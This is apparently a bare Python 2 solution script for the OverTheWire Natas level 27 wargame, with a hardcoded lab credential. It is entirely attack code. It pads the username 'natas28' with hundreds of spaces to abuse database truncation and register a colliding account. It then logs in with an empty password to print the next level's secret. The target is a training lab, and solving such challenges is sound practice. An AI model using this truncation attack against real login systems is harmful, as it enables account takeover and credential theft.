import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas27.natas.labs.overthewire.org/'
auth = HTTPBasicAuth('natas27', '55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ')

cookies = dict()
data = dict(username='natas28' + ' '*666 + 'Z', password='')

r = requests.post(HOST, cookies=cookies, auth=auth, data=data)

if 'Wrong password' not in r.content:
    print r.content

data = dict(username='natas28', password='')
r = requests.post(HOST, cookies=cookies, auth=auth, data=data)

if 'Wrong password' not in r.content:
    print r.content
